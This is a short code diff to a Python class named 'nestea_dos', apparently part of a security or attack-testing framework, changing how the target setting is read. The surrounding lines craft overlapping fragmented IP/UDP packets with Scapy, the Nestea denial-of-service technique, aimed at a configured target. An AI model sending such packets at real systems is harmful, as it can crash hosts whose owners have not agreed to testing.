@@ -17,7 +17,7 @@ class nestea_dos(DoS):
                     fragmented datagram packets with overlapping payloads."""
 
     def initialize(self):
-        target = self.config['target']['value']
+        target = self.config['target'].value
         try:
             pkt1 = IP(dst=target, id=42, flags="MF") / UDP() / ("X" * 10)
             pkt2 = IP(dst=target, id=42, frag=48) / ("X" * 116)
